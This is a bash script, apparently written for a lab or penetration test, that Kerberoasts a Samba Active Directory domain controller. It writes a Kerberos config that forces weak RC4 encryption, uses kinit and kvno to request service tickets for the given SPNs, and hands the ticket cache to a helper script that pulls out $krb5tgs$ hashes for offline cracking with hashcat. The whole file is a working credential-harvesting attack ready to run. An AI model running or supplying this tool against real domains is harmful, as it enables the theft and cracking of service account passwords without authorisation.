#!/usr/bin/env bash
# Kerberoast a Samba AD DC WITHOUT hitting impacket's KRB_AP_ERR_INAPP_CKSUM bug.
# Native MIT kinit+kvno mint the TGS tickets (RC4/etype-23 forced for clean hashcat-13100),
# then extract-tgs-from-ccache.py converts the ccache into $krb5tgs$ hashes.
#
# Prereqs on the attacker host:
#   dnf install -y krb5-workstation     # provides kinit/kvno (Fedora); apt: krb5-user
#   impacket available (e.g. /opt/ad-tools-venv/bin/python)
#
# Usage:
#   ./samba-kerberoast.sh <DC_IP> <REALM> <admin_user> <admin_pass> <SPN> [SPN...]
# Example:
#   ./samba-kerberoast.sh 192.168.122.50 TARS.LOCAL Administrator 'TarsLab2026!' \
#       MSSQLSvc/dc01.tars.local:1433 CIFS/backup.tars.local HTTP/app.tars.local HTTP/web.tars.local
#
# Get the SPN list first with (enumeration works even though -request does not):
#   GetUserSPNs.py <REALM>/<user>:<pass> -dc-ip <DC_IP> -dc-host <dc_fqdn>
set -euo pipefail
DC="$1"; REALM="$2"; USER="$3"; PASS="$4"; shift 4
PY="${PY:-/opt/ad-tools-venv/bin/python}"
CONF="/tmp/krb5-${REALM}.conf"
CC="/tmp/krb5cc_${REALM}"
low="$(echo "$REALM" | tr '[:upper:]' '[:lower:]')"
cat > "$CONF" <<EOF
[libdefaults]
    default_realm = ${REALM}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    allow_weak_crypto = true
    default_tkt_enctypes = arcfour-hmac-md5
    default_tgs_enctypes = arcfour-hmac-md5
    default_ccache_name = FILE:${CC}
[realms]
    ${REALM} = {
        kdc = ${DC}
    }
[domain_realm]
    .${low} = ${REALM}
    ${low} = ${REALM}
EOF
export KRB5_CONFIG="$CONF" KRB5CCNAME="FILE:${CC}"
printf '%s' "$PASS" | kinit "${USER}@${REALM}"
for spn in "$@"; do kvno "$spn" >/dev/null; done
exec "$PY" "$(dirname "$0")/extract-tgs-from-ccache.py" "$CC"
